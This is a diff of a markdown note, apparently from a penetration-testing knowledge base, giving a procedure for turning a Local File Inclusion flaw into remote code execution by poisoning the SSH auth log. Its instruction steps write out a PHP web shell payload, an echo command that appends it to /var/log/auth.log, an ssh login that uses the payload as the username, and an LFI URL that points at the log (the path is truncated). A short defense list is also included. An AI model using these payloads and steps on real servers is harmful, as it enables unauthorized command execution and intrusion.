@@ -35,11 +35,15 @@ This procedure involves exploiting a Local File Inclusion (LFI) vulnerability to
 
 This procedure involves exploiting a Local File Inclusion (LFI) vulnerability to achieve Remote Code Execution (RCE) via an SSH log file. The attacker first inserts a PHP code into the SSH log file, which is then included in the web application through an LFI vulnerability. The attacker can then execute arbitrary commands on the target system via the PHP code included in the log file. This technique can be used to gain initial access to a system and escalate privileges.
 
+ 
+
 ## Requirements
 
 1. Access to a web application with an LFI vulnerability
 
 1. Ability to modify the SSH log file
+
+ 
 
 ## Defense
 
@@ -49,6 +53,8 @@ This procedure involves exploiting a Local File Inclusion (LFI) vulnerability to
 
 1. Restrict access to log files
 
+ 
+
 ## Objectives
 
 1. Gain initial access to the target system
@@ -57,31 +63,55 @@ This procedure involves exploiting a Local File Inclusion (LFI) vulnerability to
 
 1. Execute arbitrary commands on the target system
 
+ 
+
 # Instructions
 
 1. echo "<?php system($_GET[\"cmd\"]);?>" >> /var/log/auth.log
 
+ 
+
+
+
 **Code**: [[<?php system($_GET["cmd"]);?>]]
+
+
 
 > This command appends the PHP code to the end of the SSH log file.
 
 2. 
 
+ 
+
+
+
 **Code**: [[ssh <?php system($_GET["cmd"]);?>@10.10.10.10]]
+
+
 
 > 
 
 3. 
 
+ 
+
+
+
 **Code**: [[http://example.com/index.php?page=/var/log/auth.lo]]
 
+
+
 > 
+
+
 
 **Command** ([[Execute Command 'id']]):
 
 ```bash
 id
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -107,3 +137,5 @@ id
 - [[File Inclusion]]
 - [[LFI to RCE via controlled log file]]
 - [[RCE via SSH]]
+
+
